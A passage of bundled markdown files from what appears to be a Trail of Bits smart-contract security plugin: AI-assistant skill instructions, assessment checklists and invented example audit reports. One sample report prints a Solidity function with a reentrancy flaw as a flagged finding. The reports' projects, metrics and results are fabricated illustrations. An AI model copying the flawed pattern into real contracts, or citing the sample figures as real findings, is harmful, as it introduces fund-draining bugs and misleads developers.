straightforward, no analysis needed\" | Obvious architectures have subtle trust boundaries | Analyze on-chain/off-chain distribution, access control flow, external dependencies |\n| \"Common pitfalls don't apply to this codebase\" | Every codebase has common pitfalls | Systematically check all guideline pitfalls with grep/code search |\n| \"Tests exist, testing guideline is satisfied\" | Test existence  test quality | Check coverage, property-based tests, integration tests, failure cases |\n| \"I can provide generic best practices\" | Generic advice isn't actionable | Provide project-specific findings with file:line references |\n| \"User knows what to improve from findings\" | Findings without prioritization = no action plan | Generate prioritized improvement roadmap with specific next steps |\n\n---\n\n## Notes\n\n- I'll only analyze relevant sections (won't hallucinate about upgrades if not present)\n- I'll adapt to your platform (Solidity, Rust, Cairo, etc.)\n- I'll use available tools (Slither, etc.) but work without them if unavailable\n- I'll provide file references and line numbers for all findings\n- I'll ask questions about design decisions I can't infer from code\n\n---\n\n## Ready to Begin\n\n**What I'll need**:\n- Access to your codebase\n- Context about your project goals\n- Any existing documentation or specifications\n- Information about deployment plans\n\nLet's analyze your codebase and improve it using Trail of Bits' best practices!\n",
        "plugins/building-secure-contracts/skills/guidelines-advisor/resources/ASSESSMENT_AREAS.md": "## Assessment Areas\n\n### 1. DOCUMENTATION & SPECIFICATIONS\n\n**What I'll do**:\n- Read existing documentation (README, specs, comments)\n- Analyze contract/module purposes and interactions\n- Identify undocumented assumptions\n- For Solidity projects: check NatSpec completeness\n- Generate architectural diagrams using Slither printers (if available)\n\n**I'll generate**:\n- Plain English system description\n- Contract interaction diagrams\n- State machine diagrams (where applicable)\n- Documentation gaps list\n\n**Best practices**:\n- Every contract should have a clear purpose statement\n- All assumptions should be explicitly documented\n- Critical functions should have detailed documentation\n- System interactions should be visualized\n- State transitions should be clear\n\n---\n\n### 2. ON-CHAIN vs OFF-CHAIN COMPUTATION\n\n**What I'll analyze**:\n- Current on-chain logic complexity\n- Data processing patterns\n- Verification vs computation patterns\n\n**I'll look for**:\n- Complex computations that could move off-chain\n- Sorting/ordering operations done on-chain\n- Data preprocessing opportunities\n- Gas optimization potential\n\n**I'll suggest**:\n- Off-chain preprocessing with on-chain verification\n- Data structure optimizations\n- Gas-efficient architectural changes\n\n**Note**: Only applicable if your project has off-chain components or could benefit from them. I won't hallucinate this if it's not relevant.\n\n---\n\n### 3. UPGRADEABILITY\n\n**What I'll check**:\n- Does the project support upgrades?\n- What upgradeability pattern is used?\n- Is the approach documented?\n\n**I'll analyze**:\n- Migration vs upgradeability trade-offs\n- Data separation vs delegatecall proxy patterns\n- Upgrade/migration procedure documentation\n- Deployment and initialization scripts\n\n**I'll recommend**:\n- Whether migration might be better than upgradeability\n- Data separation pattern if suitable\n- Documenting the upgrade procedure before deployment\n\n**Best practices**:\n- Favor contract migration over upgradeability\n- Use data separation instead of delegatecall proxy when possible\n- Document migration/upgrade procedure including:\n  - Calls to initiate new contracts\n  - Key storage locations and access methods\n  - Deployment verification scripts\n\n**Note**: Only applicable if your project has or plans upgradeability. I'll skip this if not relevant.\n\n---\n\n### 4. DELEGATECALL PROXY PATTERN\n\n**What I'll check**:\n- Is delegatecall used for proxies?\n- Storage layout consistency\n- Inheritance order implications\n- Initialization patterns\n\n**I'll analyze for**:\n\n**Storage Layout**:\n- Proxy and implementation storage compatibility\n- Shared base contract for state variables\n- Storage slot conflicts\n\n**Inheritance**:\n- Inheritance order consistency\n- Storage layout effects from inheritance changes\n\n**Initialization**:\n- Implementation initialization status\n- Front-running risks\n- Factory pattern usage\n\n**Function Shadowing**:\n- Same methods on proxy and implementation\n- Administrative function shadowing\n- Call routing correctness\n\n**Direct Implementation Usage**:\n- Implementation state protection\n- Direct usage prevention mechanisms\n- Self-destruct risks\n\n**Immutable/Constant Variables**:\n- Sync between proxy and implementation\n- Bytecode embedding issues\n\n**Contract Existence Checks**:\n- Low-level call protections\n- Empty bytecode handling\n- Constructor execution considerations\n\n**Tools I'll use**:\n- Slither's `slither-check-upgradeability` (if available)\n- Manual pattern analysis\n\n**Note**: Only applicable if delegatecall proxies are present. I'll skip this if not relevant.\n\n---\n\n### 5. FUNCTION COMPOSITION\n\n**What I'll analyze**:\n- System logic organization\n- Function sizes and purposes\n- Code modularity\n\n**I'll look for**:\n- Large functions doing too many things\n- Unclear function purposes\n- Logic that could be better separated\n- Grouping opportunities (authentication, arithmetic, etc.)\n\n**I'll recommend**:\n- Function splitting for clarity\n- Logical grouping strategies\n- Component isolation for testing\n\n**Best practices**:\n- Divide system logic through contracts or function groups\n- Write small functions with clear purposes\n- Make code easy to review and test\n\n---\n\n### 6. INHERITANCE\n\n**What I'll check**:\n- Inheritance tree depth and width\n- Inheritance complexity\n\n**I'll analyze**:\n- Inheritance hierarchy using Slither (if available)\n- Diamond problem risks\n- Override patterns\n- Virtual function usage\n\n**I'll recommend**:\n- Simplifying complex hierarchies\n- Flattening when appropriate\n- Clear inheritance documentation\n\n**Best practices**:\n- Keep inheritance manageable\n- Minimize depth and width\n- Use Slither's inheritance printer to visualize\n\n---\n\n### 7. EVENTS\n\n**What I'll check**:\n- Events for critical operations\n- Event completeness\n- Event naming consistency\n\n**I'll look for**:\n- Critical operations without events\n- Inconsistent event patterns\n- Missing indexed parameters\n- Event documentation\n\n**I'll recommend**:\n- Adding events for critical operations:\n  - State changes\n  - Transfers\n  - Access control changes\n  - Parameter updates\n- Event naming conventions\n- Indexed parameters for filtering\n\n**Best practices**:\n- Log all critical operations\n- Events facilitate debugging during development\n- Events enable monitoring after deployment\n\n---\n\n### 8. COMMON PITFALLS\n\n**What I'll check**:\n- Known vulnerability patterns\n- Platform-specific issues\n- Language-specific gotchas\n\n**I'll analyze for**:\n- Reentrancy patterns\n- Integer overflow/underflow (pre-0.8 Solidity)\n- Access control issues\n- Front-running vulnerabilities\n- Oracle manipulation risks\n- Timestamp dependence\n- Uninitialized variables\n- Delegatecall risks\n- Platform-specific pitfalls\n\n**Resources I reference**:\n- Not So Smart Contracts (Trail of Bits)\n- Solidity documentation warnings\n- Platform-specific vulnerability databases\n\n**I'll recommend**:\n- Specific fixes for identified issues\n- Prevention patterns\n- Security review resources\n\n---\n\n### 9. DEPENDENCIES\n\n**What I'll analyze**:\n- External libraries used\n- Library versions\n- Dependency management approach\n- Copy-pasted code\n\n**I'll check for**:\n- Well-tested libraries (OpenZeppelin, etc.)\n- Dependency manager usage\n- Outdated dependencies\n- Copied code instead of imports\n- Custom implementations of standard functionality\n\n**I'll recommend**:\n- Using established libraries\n- Dependency manager setup\n- Updating outdated dependencies\n- Replacing copied code with imports\n\n**Best practices**:\n- Use well-tested libraries\n- Use dependency manager (npm, forge, cargo, etc.)\n- Keep external sources up-to-date\n- Avoid reinventing the wheel\n\n---\n\n### 10. TESTING & VERIFICATION\n\n**What I'll analyze**:\n- Test files and coverage\n- Testing techniques used\n- CI/CD setup\n- Automated security testing\n\n**I'll check for**:\n- Unit test completeness\n- Integration tests\n- Edge case testing\n- Slither checks\n- Fuzzing (Echidna, Foundry, AFL, etc.)\n- Formal verification\n- CI/CD configuration\n\n**I'll recommend**:\n- Test coverage improvements\n- Advanced testing techniques:\n  - Fuzzing with Echidna or Foundry\n  - Custom Slither detectors\n  - Formal verification properties\n  - Mutation testing\n- CI/CD integration\n- Pre-deployment verification scripts\n\n**Best practices**:\n- Create thorough unit tests\n- Develop custom Slither and Echidna checks\n- Automate security testing in CI\n\n---\n\n### 11. PLATFORM-SPECIFIC GUIDANCE\n\n#### Solidity Projects\n\n**I'll check**:\n- Solidity version used\n- Compiler warnings\n- Inline assembly usage\n\n**I'll recommend**:\n- Stable Solidity versions (per Slither recommendations)\n- Compiling with stable version\n- Checking warnings with latest version\n- Avoiding inline assembly without EVM expertise\n\n**Best practices**:\n- Favor Solidity 0.8.x for overflow protection\n- Compile with stable release\n- Check for warnings with latest release\n- Avoid inline assembly unless absolutely necessary\n\n#### Other Platforms\n\n**I'll provide**:\n- Platform-specific best practices\n- Tool recommendations\n- Security considerations\n\n---\n",
        "plugins/building-secure-contracts/skills/guidelines-advisor/resources/DELIVERABLES.md": "\n## Deliverables\n\n### 1. System Documentation\n\n**Plain English Description**:\n```\n[Project Name] System Overview\n\nPurpose:\n[Clear description of what the system does]\n\nComponents:\n[List of contracts/modules and their roles]\n\nAssumptions:\n[Explicit assumptions about the codebase, environment, users]\n\nInteractions:\n[How components interact with each other]\n\nCritical Operations:\n[Key operations and their purposes]\n```\n\n**Architectural Diagrams**:\n- Contract inheritance graph\n- Contract interaction graph\n- State machine diagram (if applicable)\n\n**Code Documentation Gaps**:\n- List of undocumented functions\n- Missing NatSpec/documentation\n- Unclear assumptions\n\n---\n\n### 2. Architecture Analysis\n\n**On-Chain/Off-Chain Assessment**:\n- Current distribution\n- Optimization opportunities\n- Gas savings potential\n- Complexity reduction suggestions\n\n**Upgradeability Review**:\n- Current approach assessment\n- Alternative patterns consideration\n- Procedure documentation status\n- Recommendations\n\n**Proxy Pattern Review** (if applicable):\n- Security assessment\n- Slither-check-upgradeability findings\n- Specific risks identified\n- Mitigation recommendations\n\n---\n\n### 3. Implementation Review\n\n**Function Composition**:\n- Complex functions requiring splitting\n- Logic grouping suggestions\n- Modularity improvements\n\n**Inheritance**:\n- Hierarchy visualization\n- Complexity assessment\n- Simplification recommendations\n\n**Events**:\n- Missing events list\n- Event improvements\n- Monitoring setup suggestions\n\n**Pitfalls**:\n- Identified vulnerabilities\n- Severity assessment\n- Fix recommendations\n\n**Dependencies**:\n- Library assessment\n- Update recommendations\n- Dependency management suggestions\n\n**Testing**:\n- Coverage analysis\n- Testing gaps\n- Advanced technique recommendations\n- CI/CD suggestions\n\n---\n\n### 4. Prioritized Recommendations\n\n**CRITICAL** (address immediately):\n- Security vulnerabilities\n- Proxy implementation issues\n- Missing critical events\n- Broken upgrade paths\n\n**HIGH** (address before deployment):\n- Documentation gaps\n- Testing improvements\n- Dependency updates\n- Architecture optimizations\n\n**MEDIUM** (address for production quality):\n- Code organization\n- Event completeness\n- Function clarity\n- Inheritance simplification\n\n**LOW** (nice to have):\n- Additional tests\n- Documentation enhancements\n- Gas optimizations\n",
        "plugins/building-secure-contracts/skills/guidelines-advisor/resources/EXAMPLE_REPORT.md": "## Example Output\n\nWhen the analysis is complete, you'll receive comprehensive guidance like this:\n\n```\n=== DEVELOPMENT GUIDELINES ANALYSIS ===\n\nProject: NFT Marketplace\nPlatform: Solidity (Ethereum)\nAnalysis Date: March 15, 2024\n\n---\n\n## 1. DOCUMENTATION & SPECIFICATIONS\n\n### Generated System Description\n\n**Plain English Overview:**\nThe NFT Marketplace allows users to list, buy, and auction ERC721 tokens.\nThe system uses a decentralized orderbook where sellers create listings with\nprice and duration. Buyers can purchase instantly or place bids for auctions.\nA 2.5% platform fee is collected on each sale.\n\n**Key Assumptions:**\n- All NFTs follow ERC721 standard\n- Prices denominated in ETH only\n- No token whitelisting (any ERC721 accepted)\n- Platform fee immutable after deployment\n\n### Architectural Diagrams Generated\n\n contract-interactions.png - Shows Marketplace, OrderBook, FeeCollector flow\n state-machine.png - Listing states (Created  Active  Sold/Cancelled/Expired)\n auction-flow.png - Bid placement and finalization sequence\n\n### Documentation Gaps Identified\n\n Missing NatSpec:\n- OrderBook.cancelOrder() - No @notice or @param\n- FeeCollector.withdrawFees() - Missing @dev implementation notes\n\n Undocumented Assumptions:\n- What happens if NFT transfer fails during purchase?\n- Are listings automatically cleaned up after expiration?\n- Fee distribution mechanism not explained\n\n**Recommendation:** Add comprehensive NatSpec to all public functions\nand document error handling for external calls.\n\n---\n\n## 2. ARCHITECTURE ANALYSIS\n\n### On-Chain vs Off-Chain Components\n\n**Current Distribution:**\n- On-Chain: Listing creation, order execution, fee collection\n- Off-Chain: Order discovery, price indexing, user notifications\n\n**Optimization Opportunities:**\n Order matching is efficient (on-chain orderbook)\n Listing enumeration is gas-intensive\n\n**Recommendation:**\nConsider moving listing discovery off-chain using event indexing.\nKeep core execution on-chain. Estimated gas savings: 40% for browse operations.\n\n### Upgradeability Review\n\n**Current Pattern:** TransparentUpgradeableProxy (OpenZeppelin)\n\n**Assessment:**\n Proxy and implementation use shared storage base\n Initialization properly handled\n No function shadowing detected\n No timelock on upgrades (admin can upgrade immediately)\n\n**Critical Issue:**\nFile: contracts/Marketplace.sol\nThe marketplace uses delegatecall proxy but admin is EOA without timelock.\n\n**Recommendation:**\n- Deploy TimelockController (48-hour delay)\n- Transfer proxy admin to timelock\n- Add emergency pause for critical bugs\n\n### Proxy Pattern Security\n\n**Findings:**\n Storage layout consistent (inherits MarketplaceStorage)\n No constructors in implementation\n Initialize function has initializer modifier\n Immutable variables in proxy (PLATFORM_FEE)\n\n**Issue:** PLATFORM_FEE defined as immutable in proxy will not update\nif implementation changes this value.\n\n**Fix:** Move PLATFORM_FEE to storage or accept it's immutable forever.\n\n---\n\n## 3. IMPLEMENTATION REVIEW\n\n### Function Composition\n\n**Complex Functions Identified:**\n executePurchase() - 45 lines, cyclomatic complexity: 12\n  - Handles payment, NFT transfer, fee calc, event emission\n  - Recommendation: Extract _validatePurchase(), _processPayment(), _transferNFT()\n\n finalizeAuction() - 38 lines, cyclomatic complexity: 10\n  - Multiple nested conditionals for winner determination\n  - Recommendation: Extract _determineWinner(), _refundLosers()\n\n Other functions well-scoped (average 15 lines)\n\n### Inheritance\n\n**Hierarchy Analysis:**\n```\nMarketplace\n Ownable\n ReentrancyGuard\n Pausable\n MarketplaceStorage\n```\n\n Shallow inheritance (depth: 2)\n No diamond problem\n Clear separation of concerns\n\n**Slither Inheritance Graph:** contracts/inheritance.png (generated)\n\n### Events\n\n**Event Coverage:**\n 12 events defined\n All state changes emit events\n Consistent naming (ListingCreated, OrderFulfilled, BidPlaced)\n Indexed parameters for filtering (tokenId, seller, buyer)\n\n Missing Events:\n- Platform fee updates (if ever made variable)\n- Pause/unpause operations\n\n**Recommendation:** Add PlatformPaused/Unpaused events for monitoring.\n\n### Common Pitfalls\n\n**Issues Found:**\n\n CRITICAL: Reentrancy in executePurchase()\nFile: contracts/Marketplace.sol:234\n```solidity\nfunction executePurchase(uint256 listingId) external payable {\n    Listing memory listing = listings[listingId];\n    IERC721(listing.nftContract).transferFrom(listing.seller, msg.sender, listing.tokenId);\n    // State update AFTER external call!\n    listing.status = Status.Sold;\n}\n```\n**Fix:** Follow checks-effects-interactions. Update state before external calls.\n\n HIGH: Unvalidated external call return\nFile: contracts/Marketplace.sol:245\n```solidity\npayable(seller).transfer(amount);  // Can fail silently\n```\n**Fix:** Use call{value}() and check return value or use Address.sendValue().\n\n No timestamp dependence\n No tx.origin usage\n Integer overflow protected (Solidity 0.8+)\n\n---\n\n## 4. DEPENDENCIES\n\n**Current Dependencies:**\n @openzeppelin/contracts@4.9.0 - Well-tested, good choice\n Custom ERC721 implementation (contracts/CustomERC721.sol)\n\n**Issues:**\n CustomERC721 reinvents OpenZeppelin's ERC721\n   - 234 lines of duplicate code\n   - No added functionality\n   - Increases audit surface\n\n**Recommendation:**\nReplace CustomERC721 with OpenZeppelin's implementation.\nSaves 234 lines, reduces risk, improves maintainability.\n\n**Dependency Management:**\n Using npm for dependencies\n Package versions pinned\n Dependencies not updated in 8 months\n\n**Action:** Update @openzeppelin/contracts to latest 5.x (breaking changes, test thoroughly)\n\n---\n\n## 5. TESTING EVALUATION\n\n**Current Test Suite:**\n- 45 unit tests (forge test)\n- 12 integration tests\n- Coverage: 78%\n\n**Gaps Identified:**\n No fuzzing (Echidna/Foundry)\n No formal verification\n Edge cases not covered:\n  - Auction with zero bids\n  - Listing with expired timestamp\n  - Purchase during contract pause\n\n**Recommendations:**\n1. Add Foundry invariant tests:\n   - Total fees collected == sum of individual sales * 0.025\n   - Active listings count matches actual active listings\n   - No NFT can be in multiple active listings\n\n2. Increase coverage to 95%+ by testing:\n   - Pausable functions during pause state\n   - Reentrancy attack scenarios\n   - Failed NFT transfers\n\n3. Add integration tests:\n   - End-to-end auction flow with multiple bidders\n   - Platform fee collection and withdrawal\n   - Upgrade and data migration\n\n**Estimated Effort:** 1-2 weeks to reach 95% coverage with invariant testing\n\n---\n\n## PRIORITIZED RECOMMENDATIONS\n\n### CRITICAL (Fix Immediately)\n1. **Fix reentrancy in executePurchase()** [HIGH IMPACT]\n   - Risk: Funds can be drained\n   - Effort: 1 day\n   - File: contracts/Marketplace.sol:234\n\n2. **Validate external call returns** [HIGH IMPACT]\n   - Risk: Failed transfers not detected\n   - Effort: 1 day\n   - Files: Multiple payment operations\n\n3. **Add timelock to upgrades** [HIGH IMPACT]\n   - Risk: Instant malicious upgrade\n   - Effort: 2 days\n\n### HIGH (Before Mainnet)\n4. **Remove CustomERC721, use OpenZeppelin** [MEDIUM IMPACT]\n   - Benefit: Reduce code, increase security\n   - Effort: 3 days\n\n5. **Increase test coverage to 95%** [MEDIUM IMPACT]\n   - Benefit: Catch edge case bugs\n   - Effort: 1-2 weeks\n\n6. **Add comprehensive NatSpec** [LOW IMPACT]\n   - Benefit: Better documentation\n   - Effort: 2-3 days\n\n### MEDIUM (Post-Launch V2)\n7. **Optimize listing enumeration** [MEDIUM IMPACT]\n   - Benefit: 40% gas savings on reads\n   - Effort: 1 week\n\n8. **Add invariant fuzzing** [HIGH IMPACT]\n   - Benefit: Discover hidden bugs\n   - Effort: 1 week\n\n---\n\n## SUMMARY\n\n**Overall Assessment:** MODERATE MATURITY\n\nThe codebase follows many best practices with good use of OpenZeppelin\nlibraries and clear architecture. Critical issues are reentrancy vulnerability\nand lack of upgrade timelock. Testing needs improvement.\n\n**Path to Production:**\n1. Fix CRITICAL items (reentrancy, timelock) - Week 1\n2. Address HIGH items (dependencies, testing) - Week 2-3\n3. External audit - Week 4-5\n4. Mainnet deployment with documented limitations\n5. MEDIUM items in V2 - Month 2-3\n\n**Estimated Timeline:** 3-4 weeks to production-ready state.\n\n---\n\nAnalysis completed using Trail of Bits Development Guidelines\n```\n",
        "plugins/building-secure-contracts/skills/secure-workflow-guide/SKILL.md": "---\nname: secure-workflow-guide\ndescription: Guides through Trail of Bits' 5-step secure development workflow. Runs Slither scans, checks special features (upgradeability/ERC conformance/token integration), generates visual security diagrams, helps document security properties for fuzzing/verification, and reviews manual security areas.\n---\n\n# Secure Workflow Guide\n\n## Purpose\n\nGuides through Trail of Bits' secure development workflow - a 5-step process to enhance smart contract security throughout development.\n\n**Use this**: On every check-in, before deployment, or when you want a security review\n\n---\n\n## The 5-Step Workflow\n\nCovers a security workflow including:\n\n### Step 1: Check for Known Security Issues\nRun Slither with 70+ built-in detectors to find common vulnerabilities:\n- Parse findings by severity\n- Explain each issue with file references\n- Recommend fixes\n- Help triage false positives\n\n**Goal**: Clean Slither report or documented triages\n\n### Step 2: Check Special Features\nDetect and validate applicable features:\n- **Upgradeability**: slither-check-upgradeability (17 upgrade risks)\n- **ERC conformance**: slither-check-erc (6 common specs)\n- **Token integration**: Recommend token-integration-analyzer skill\n- **Security properties**: slither-prop for ERC20\n\n**Note**: Only runs checks that apply to your codebase\n\n### Step 3: Visual Security Inspection\nGenerate 3 security diagrams:\n- **Inheritance graph**: Identify shadowing and C3 linearization issues\n- **Function summary**: Show visibility and access controls\n- **Variables and authorization**: Map who can write to state variables\n\nReview each diagram for security concerns\n\n### Step 4: Document Security Properties\nHelp document critical security properties:\n- State machine transitions and invariants\n- Access control requirements\n- Arithmetic constraints and precision\n- External interaction safety\n- Standards conformance\n\nThen set up testing:\n- **Echidna**: Property-based fuzzing with invariants\n- **Manticore**: Formal verification with symbolic execution\n- **Custom Slither checks**: Project-specific business logic\n\n**Note**: Most important activity for security\n\n### Step 5: Manual Review Areas\nAnalyze areas automated tools miss:\n- **Privacy**: On-chain secrets, commit-reveal needs\n- **Front-running**: Slippage protection, ordering risks, MEV\n- **Cryptography**: Weak randomness, signature issues, hash collisions\n- **DeFi interactions**: Oracle manipulation, flash loans, protocol assumptions\n\nSearch codebase for these patterns and flag risks\n\nFor detailed instructions, commands, and explanations for each step, see [WORKFLOW_STEPS.md](resources/WORKFLOW_STEPS.md).\n\n---\n\n## How I Work\n\nWhen invoked, I will:\n\n1. **Explore your codebase** to understand structure\n2. **Run Step 1**: Slither security scan\n3. **Detect and run Step 2**: Special feature checks (only what applies)\n4. **Generate Step 3**: Visual security diagrams\n5. **Guide Step 4**: Security property documentation\n6. **Analyze Step 5**: Manual review areas\n7. **Provide action plan**: Prioritized fixes and next steps\n\nAdapts based on:\n- What tools you have installed\n- What's applicable to your project\n- Where you are in development\n\n---\n\n## Rationalizations (Do Not Skip)\n\n| Rationalization | Why It's Wrong | Required Action |\n|-----------------|----------------|-----------------|\n| \"Slither not available, I'll check manually\" | Manual checking misses 70+ detector patterns | Install and run Slither, or document why it's blocked |\n| \"Can't generate diagrams, I'll describe the architecture\" | Descriptions aren't visual - diagrams reveal patterns text misses | Execute slither --print commands, generate actual visual outputs |\n| \"No upgrades detected, skip upgradeability checks\" | Proxies and upgrades are often implicit or planned | Verify with codebase search before skipping Step 2 checks |\n| \"Not a token, skip ERC checks\" | Tokens can be integrated without obvious ERC inheritance | Check for token interactions, transfers, balances before skipping |\n| \"Can't set up Echidna now, suggesting it for later\" | Property-based testing is Step 4, not optional | Document properties now, set up fuzzing infrastructure |\n| \"No DeFi interactions, skip oracle/flash loan checks\" | DeFi patterns appear in unexpected places (price feeds, external calls) | Complete Step 5 manual review, search codebase for patterns |\n| \"This step doesn't apply to my project\" | \"Not applicable\" without verification = missed vulnerabilities | Verify with explicit codebase search before declaring N/A |\n| \"I'll provide generic security advice instead of running workflow\" | Generic advice isn't actionable, workflow finds specific issues | Execute all 5 steps, generate project-specific findings with file:line references |\n\n---\n\n## Example Output\n\nWhen I complete the workflow, you'll get a comprehensive security report covering:\n\n- **Step 1**: Slither findings with severity, file references, and fix recommendations\n- **Step 2**: Special feature validation results (upgradeability, ERC conformance, etc.)\n- **Step 3**: Visual diagrams analyzing inheritance, functions, and state variable authorization\n- **Step 4**: Documented security properties and testing setup (Echidna/Manticore)\n- **Step 5**: Manual review findings (privacy, front-running, cryptography, DeFi risks)\n- **Action plan**: Critical/high/medium priority tasks with effort estimates\n- **Workflow checklist**: Progress on all 5 steps\n\nFor a complete example workflow report, see [EXAMPLE_REPORT.md](resources/EXAMPLE_REPORT.md).\n\n---\n\n## What You'll Get\n\n**Security Report**:\n- Slither findings with severity and fixes\n- Special feature validation results\n- Visual diagrams (PNG/PDF)\n- Manual review findings\n\n**Action Plan**:\n- [ ] Critical issues to fix immediately\n- [ ] Security properties to document\n- [ ] Testing to set up (Echidna/Manticore)\n- [ ] Manual areas to review\n\n**Workflow Checklist**:\n- [ ] Clean Slither report\n- [ ] Special features validated\n- [ ] Visual inspection complete\n- [ ] Properties documented\n- [ ] Manual review done\n\n---\n\n## Getting Help\n\n**Trail of Bits Resources**:\n- Office Hours: Every Tuesday ([schedule](https://meetings.hubspot.com/trailofbits/office-hours))\n- Empire Hacking Slack: #crytic and #ethereum channels\n\n**Other Security**:\n- Remember: Security is about more than smart contracts\n- Off-chain security (owner keys, infrastructure) equally critical\n\n---\n\n## Ready to Start\n\nLet me know when you're ready and I'll run through the workflow with your codebase!\n",
        "plugins/building-secure-contracts/skills/secure-workflow-guide/resources/EXAMPLE_REPORT.md": "## Example Output\n\nWhen I complete the workflow, you'll get a comprehensive security report:\n\n```\n=== SECURE DEVELOPMENT WORKFLOW REPORT ===\n\nProject: DeFi Staking Contract\nPlatform: Solidity 0.8.19\nWorkflow Date: March 15, 2024\n\n---\n\n## STEP 1: KNOWN SECURITY ISSUES\n\n### Slither Security Scan\n\nCommand: slither . --exclude-dependencies\nStatus:  CLEAN (after fixes)\n\n**Issues Found & Resolved:**\n HIGH: Reentrancy in withdraw() - FIXED (added ReentrancyGuard)\n MEDIUM: Unprotected selfdestruct - FIXED (removed function)\n LOW: Missing zero-address checks - FIXED (added require statements)\n INFO: 5 optimization suggestions - DOCUMENTED\n\n**Current Status:** All high/medium issues resolved. Ready for next steps.\n\n---\n\n## STEP 2: SPECIAL FEATURES\n\n### Upgradeability Check\n\nPattern Detected: UUPS Proxy (ERC1967)\n\n**slither-check-upgradeability Results:**\n Storage layout compatible\n No function collisions\n Initialize function protected\n _authorizeUpgrade restricted to owner\n No timelock on upgrades\n\n**Recommendation:** Add 48-hour timelock before Step 3 (Critical)\n\n### ERC20 Conformance\n\n**slither-check-erc Results:**\n All required functions present\n transfer/transferFrom return bool\n decimals returns uint8\n approve race condition mitigated (increaseAllowance/decreaseAllowance)\n No external calls in transfer functions\n\n**Status:** FULLY COMPLIANT with ERC20 standard\n\n---\n\n## STEP 3: VISUAL SECURITY INSPECTION\n\n### Inheritance Graph\n\nFile: inheritance-graph.png\n\n**Analysis:**\n```\nStakingToken\n ERC20Upgradeable\n   IERC20\n   Context\n OwnableUpgradeable\n UUPSUpgradeable\n```\n\n Shallow hierarchy (depth: 3)\n No shadowing detected\n C3 linearization correct\n No diamond inheritance issues\n\n### Function Summary\n\n| Function           | Visibility | Modifiers          | Mutability  | Risk  |\n|--------------------|------------|--------------------|-------------|-------|\n| stake()            | external   | nonReentrant       | non-payable | Low   |\n| withdraw()         | external   | nonReentrant       | non-payable | Low   |\n| claimRewards()     | external   | nonReentrant       | non-payable | Low   |\n| setRewardRate()    | external   | onlyOwner          | non-payable | Med   |\n| pause()            | external   | onlyOwner          | non-payable | Med   |\n| _authorizeUpgrade()| internal   | onlyOwner          | view        | High  |\n\n All privileged functions have access controls\n External functions have reentrancy protection\n setRewardRate() allows owner to set arbitrary rate (no bounds)\n\n**Recommendation:** Add min/max bounds to setRewardRate()\n\n### Variables and Authorization\n\n**State Variable Access:**\n\ntotalStaked (uint256)\n Written by: stake() [external, nonReentrant]\n Written by: withdraw() [external, nonReentrant]\n Read by: calculateRewards() [internal]\n\nrewardRate (uint256)\n Written by: setRewardRate() [external, onlyOwner]\n Read by: calculateRewards() [internal]\n No bounds checking - can be set to extreme values\n\nuserStakes (mapping)\n Written by: stake() [external, nonReentrant]\n Written by: withdraw() [external, nonReentrant]\n Protected by access controls \n\n**Critical Finding:** rewardRate modification needs validation\n\n---\n\n## STEP 4: SECURITY PROPERTIES DOCUMENTED\n\n### Properties Defined\n\n**State Machine Invariants:**\n1. totalStaked == sum of all userStakes[user]\n2. contract balance >= totalStaked + totalRewards\n3. User cannot withdraw more than staked\n\n**Access Control Properties:**\n4. Only owner can modify rewardRate\n5. Only owner can pause/unpause\n6. Only owner can authorize upgrades\n\n**Arithmetic Properties:**\n7. calculateRewards() cannot overflow\n8. Staking amount must be > 0\n9. Reward calculation precision loss < 0.01%\n\n### Testing Setup\n\n**Echidna Configuration Created:**\nFile: echidna.yaml\n```yaml\ntestMode: assertion\ntestLimit: 50000\ndeployer: \"0x10000\"\nsender: [\"0x10000\", \"0x20000\", \"0x30000\"]\n```\n\n**Invariants Implemented:**\nFile: test/echidna/StakingInvariants.sol\n```solidity\ncontract StakingInvariants {\n    function echidna_total_staked_matches_sum() public returns (bool) {\n        return staking.totalStaked() == calculateExpectedTotal();\n    }\n\n    function echidna_balance_sufficient() public returns (bool) {\n        return address(staking).balance >= staking.totalStaked();\n    }\n}\n```\n\n**Fuzzing Results:**\n All 3 invariants hold after 50,000 runs\n No violations found\n Coverage: 94% of contract code\n\n**Next Step:** Run Manticore for formal verification (optional, 2-3 days)\n\n---\n\n## STEP 5: MANUAL REVIEW AREAS\n\n### Privacy Analysis\n\n No secrets stored on-chain\n All state variables appropriately public/internal\n No commit-reveal needed for current design\n User staking amounts are publicly visible\n\n**Note:** Public visibility of stakes is acceptable for this use case.\n\n### Front-Running Risks\n\n**Identified Risks:**\n setRewardRate() can be front-run by users to claim before rate decrease\n\n**Scenario:**\n1. Owner submits tx to decrease rewardRate from 10% to 5%\n2. Users see pending tx in mempool\n3. Users front-run with claimRewards() at old 10% rate\n\n**Mitigation:**\n- Add timelock to rewardRate changes (48-hour delay)\n- Implement gradual rate transitions\n\n### Cryptography Review\n\n No custom cryptography used\n No randomness requirements\n No signature verification\nN/A - Contract doesn't use cryptographic operations\n\n### DeFi Interaction Risks\n\n**External Dependencies:**\n- None (self-contained staking contract)\n\n No oracle dependencies\n No flash loan risks (uses snapshots)\n No external protocol calls\n\n**Assessment:** Low DeFi interaction risk\n\n---\n\n## ACTION PLAN\n\n### Critical (Fix Before Deployment - Week 1)\n\n1.  **Add timelock to upgrades** [COMPLETED]\n   - Deployed TimelockController\n   - 48-hour delay configured\n   - Owner transferred to timelock\n\n2.  **Add bounds to setRewardRate()** [IN PROGRESS]\n   - Add MIN_REWARD_RATE = 1%\n   - Add MAX_REWARD_RATE = 50%\n   - Estimated completion: 1 day\n\n3.  **Add timelock to rewardRate changes** [PENDING]\n   - Use same timelock as upgrades\n   - Estimated effort: 2 days\n\n### High Priority (Before Audit - Week 2)\n\n4. **Document all security properties** [80% COMPLETE]\n   - 9/12 properties documented\n   - Need to document upgrade invariants\n   - Estimated completion: 2 days\n\n5. **Increase test coverage to 95%** [CURRENT: 89%]\n   - Add pause state tests\n   - Add edge case tests (zero amounts, etc.)\n   - Estimated effort: 3 days\n\n### Medium Priority (Nice to Have)\n\n6. **Add Manticore formal verification**\n   - Verify critical properties formally\n   - Estimated effort: 1 week\n   - Impact: High confidence\n\n---\n\n## WORKFLOW CHECKLIST\n\n Step 1: Slither scan clean\n Step 2: Special features validated (upgradeability, ERC20)\n Step 3: Visual inspection complete (diagrams generated)\n Step 4: Properties documented, Echidna configured\n Step 5: Manual review complete\n\n **WORKFLOW STATUS: 95% COMPLETE**\n\n**Remaining Tasks:**\n- Add setRewardRate() bounds validation\n- Complete timelock integration\n- Document 3 remaining properties\n\n**Estimated Time to Full Completion:** 3-4 days\n\n---\n\nReady for external audit after critical tasks completed.\n\nTrail of Bits Secure Development Workflow - v0.1.0\n```\n",
